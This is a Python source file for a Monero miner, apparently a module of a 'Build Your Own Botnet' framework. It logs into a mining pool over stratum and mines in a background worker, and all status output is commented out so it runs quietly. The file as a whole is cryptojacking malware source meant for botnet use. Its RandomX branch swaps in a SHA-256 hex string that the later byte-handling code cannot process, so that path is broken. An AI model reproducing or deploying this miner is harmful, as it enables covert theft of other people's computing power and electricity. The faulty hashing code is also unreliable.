#!/usr/bin/python
"Monero Miner (Build Your Own Botnet)"

import socket
import select
import binascii
import struct
import json
import sys
import os
import time
import threading
import subprocess
import multiprocessing

import pycryptonight
# import pyrx

import hashlib


# main
def custom_rx_hash(bin, seed_hash, height):
    data = f"{bin}{seed_hash}{height}".encode('utf-8')
    sha256_hash = hashlib.sha256(data).hexdigest()
    return sha256_hash

class Miner(multiprocessing.Process):

    """
    Python based Monero miner. Based off of work in: https://github.com/jtgrassie/monero-powpy

    Utilizes a queue of jobs with a worker process to mine Monero.
    """

    def __init__(self, url, port, user):
        super(Miner, self).__init__()
        self.pool_host = url
        self.pool_port = port
        self.pool_pass = 'xx'
        self.user = user
        self.q = multiprocessing.Queue()
        self.s =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.proc = threading.Thread(target=self.worker)

    def run(self):
        pool_ip = socket.gethostbyname(self.pool_host)
        self.s.connect((pool_ip, self.pool_port))
        self.proc.daemon = True
        self.proc.start()

        login = {
            'method': 'login',
            'params': {
                'login': self.user,
                'pass': self.pool_pass,
                'rigid': '',
                'agent': 'stratum-miner-py/0.1'
            },
            'id':1
        }
        #print('Logging into pool: {}:{}'.format(self.pool_host, self.pool_port))
        self.s.sendall(str(json.dumps(login)+'\n').encode('utf-8'))

        try:
            while 1:
                line = self.s.makefile().readline()
                r = json.loads(line)
                error = r.get('error')
                result = r.get('result')
                method = r.get('method')
                params = r.get('params')
                #if error:
                    #print('Error: {}'.format(error))
                    #continue
                #if result and result.get('status'):
                    #print('Status: {}'.format(result.get('status')))
                if result and result.get('job'):
                    login_id = result.get('id')
                    job = result.get('job')
                    job['login_id'] = login_id
                    self.q.put(job)
                elif method and method == 'job' and len(login_id):
                    self.q.put(params)
        except KeyboardInterrupt:
            #print('{}Exiting'.format(os.linesep))
            self.proc.terminate()
            self.s.close()
            self.terminate()


    def pack_nonce(self, blob, nonce):
        b = binascii.unhexlify(blob)
        bin = struct.pack('39B', *bytearray(b[:39]))
        bin += struct.pack('I', nonce)
        bin += struct.pack('{}B'.format(len(b)-43), *bytearray(b[43:]))
        return bin


    def worker(self):
        started = time.time()
        hash_count = 0

        while 1:
            job = self.q.get()
            if job.get('login_id'):
                login_id = job.get('login_id')
                #print('Login ID: {}'.format(login_id))
            blob = job.get('blob')
            target = job.get('target')
            job_id = job.get('job_id')
            height = job.get('height')
            block_major = int(blob[:2], 16)
            cnv = 0
            if block_major >= 7:
                cnv = block_major - 6
            if cnv > 5:
                seed_hash = binascii.unhexlify(job.get('seed_hash'))
                #print('New job with target: {}, RandomX, height: {}'.format(target, height))
            #else:
                #print('New job with target: {}, CNv{}, height: {}'.format(target, cnv, height))
            target = struct.unpack('I', binascii.unhexlify(target))[0]
            if target >> 32 == 0:
                target = int(0xFFFFFFFFFFFFFFFF / int(0xFFFFFFFF / target))
            nonce = 1

            while 1:
                bin = self.pack_nonce(blob, nonce)
                if cnv > 5:
                    # hash = pyrx.get_rx_hash(bin, seed_hash, height)
                    hash = custom_rx_hash(bin, seed_hash, height)
                else:
                    hash = pycryptonight.cn_slow_hash(bin, cnv, 0, height)
                hash_count += 1
                # sys.stdout.write('.')
                # sys.stdout.flush()
                hex_hash = binascii.hexlify(hash).decode()
                r64 = struct.unpack('Q', hash[24:])[0]
                if r64 < target:
                    elapsed = time.time() - started
                    hr = int(hash_count / elapsed)
                    #print('{}Hashrate: {} H/s'.format(os.linesep, hr))
                    submit = {
                        'method':'submit',
                        'params': {
                            'id': login_id,
                            'job_id': job_id,
                            'nonce': binascii.hexlify(struct.pack('<I', nonce)).decode(),
                            'result': hex_hash
                        },
                        'id':1
                    }
                    #print('Submitting hash: {}'.format(hex_hash))
                    self.s.sendall(str(json.dumps(submit)+'\n').encode('utf-8'))
                    select.select([self.s], [], [], 3)
                    if not self.q.empty():
                        break
                nonce += 1


    def stop(self):
      self.s.close()
      self.terminate()


